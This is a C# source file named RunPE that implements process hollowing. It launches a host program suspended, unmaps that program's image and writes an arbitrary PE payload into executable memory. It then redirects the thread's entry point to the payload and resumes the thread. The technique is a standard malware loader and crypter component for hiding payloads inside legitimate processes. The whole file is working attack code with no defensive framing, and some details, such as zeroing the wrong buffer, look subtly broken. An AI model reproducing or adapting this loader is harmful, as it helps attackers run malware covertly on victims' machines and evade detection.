// tools used: WinDbg Preview (Available on Windows Store), and CFF Explorer Suite to inspect exe

using System;
using System.Runtime.InteropServices;

namespace ConsoleApplication1
{
    /// <summary>
    /// Created by gigajew 3/6/2023
    /// </summary>
    class RunPE
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void VirtualAllocEx(IntPtr process, IntPtr address, int size, uint allocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string appName, string cmd, IntPtr secAttrib, IntPtr threadAttrib, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, IntPtr processInfo);
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] data, int size, out int written);
        [DllImport("kernel32.dll")]
        private static extern void TerminateProcess(IntPtr hProcess, uint exitCode);
        [DllImport("kernel32.dll")]
        private static extern void ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr hThread, IntPtr context);
        [DllImport("ntdll.dll")]
        private static extern bool NtUnmapViewOfSection(IntPtr hProcess, IntPtr hAddr);
        [DllImport("kernel32.dll")]
        private static extern void RtlZeroMemory(IntPtr memory, int size);
        /// <summary>
        /// Run a payload inside another process
        /// </summary>
        /// <param name="host"></param>
        /// <param name="payload"></param>
        public static void Run(string host, byte[] payload)
        {
            int written = 0;
            bool _im64bit = IntPtr.Size * 8 == 64;

            // spawn the process
            IntPtr threadAttributes = Marshal.AllocHGlobal(0x44); // 0x44
            IntPtr processInfo = Marshal.AllocHGlobal(0x10); // 0x10

            // prevents 0xc0000142 
            RtlZeroMemory(threadAttributes, 0x44);
            RtlZeroMemory(processInfo, 0x10);

            bool hResult = CreateProcess(null, host, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, threadAttributes, processInfo);

            // read our process handles
            IntPtr hProcess = Marshal.ReadIntPtr(processInfo);
            IntPtr hThread = Marshal.ReadIntPtr(processInfo + Marshal.SizeOf(typeof(IntPtr)));

            // some simple error checking
            if (!hResult || hProcess == IntPtr.Zero || hThread == IntPtr.Zero)
            {
                Console.WriteLine("Failed to execute process");
                Console.ReadLine();
                return;
            }

            // read payload details
            int e_lfanew = Marshal.ReadInt32(payload, 0x3c);
            short sizeOfOptionalHeader = Marshal.ReadInt16(payload, e_lfanew + 0x14);
            short numberOfSections = Marshal.ReadInt16(payload, e_lfanew + 0x6);
            int sizeOfImage = Marshal.ReadInt32(payload, e_lfanew + 0x50);
            int sizeOfHeaders = Marshal.ReadInt32(payload, e_lfanew + 0x54);
            int locationOfSectionHeaders = e_lfanew + 0x14 /*file header size*/ + sizeof(int) /*e_lfanew size*/ + sizeOfOptionalHeader;
            int imageBase = Marshal.ReadInt32(payload, e_lfanew + 0x34);
            int addressOfEntrypoint = Marshal.ReadInt32(payload, e_lfanew + 0x28);

            // unmap a view of memory 
            NtUnmapViewOfSection(hProcess, (IntPtr)imageBase);

            // allocate space at target process location (our normal payload imagebase)
            VirtualAllocEx(hProcess, (IntPtr)imageBase, sizeOfImage, 0x3000, 0x40 );

            // write our payload headers
            WriteProcessMemory(hProcess, (IntPtr)imageBase, payload, sizeOfHeaders, out written);

            // write the rest of our payload to the process including code sections
            for (int i = 0; i < numberOfSections; i++)
            {
                IntPtr sectionHeader = Marshal.AllocHGlobal(0x28);
                RtlZeroMemory(sectionHeader, 0x28);

                Marshal.Copy(payload, locationOfSectionHeaders + (i * 0x28), sectionHeader, 0x28);

                int rva = Marshal.ReadInt32(sectionHeader, 0x8 + 0x4);
                int rawsize = Marshal.ReadInt32(sectionHeader, 0x8 + 0x8);
                int rawaddress = Marshal.ReadInt32(sectionHeader, 0x8 + 0xc);
                int virtualsize = Marshal.ReadInt32(sectionHeader, 0x8);

                // write to baseaddress+rva -> raw data, + size
                byte[] data = new byte[rawsize];

                Buffer.BlockCopy(payload, rawaddress, data, 0, rawsize);
                WriteProcessMemory(hProcess, (IntPtr)imageBase + rva, data, rawsize, out written);
            }

            // get thread context
            IntPtr threadContext = Marshal.AllocHGlobal(0x2cc);
            RtlZeroMemory(processInfo, 0x2cc);

            // set contextflags to 0x10001b to ensure we get the whole thread state
            Marshal.WriteInt32(threadContext, 0x10001b);

            // get thread context
            if (_im64bit)
            {
                Wow64GetThreadContext(hThread, threadContext);
            }
            else
            {
                GetThreadContext(hThread, threadContext);
            }
            int ebx = Marshal.ReadInt32(threadContext, 0xa4);

            // patch the imagebase of our process
            byte[] newImageBase = BitConverter.GetBytes(imageBase);
            WriteProcessMemory(hProcess, (IntPtr)ebx + 8, newImageBase, 0x4, out written);

            // patch eax with our entrypoint
            Marshal.WriteInt32(threadContext + 0xb0, imageBase + addressOfEntrypoint);

            // set thread context
            if (_im64bit)
            {
                Wow64SetThreadContext(hThread, threadContext);
            }
            else
            {
                SetThreadContext(hThread, threadContext);
            }

            // resume the thread
            ResumeThread(hThread);
        }
    }
}
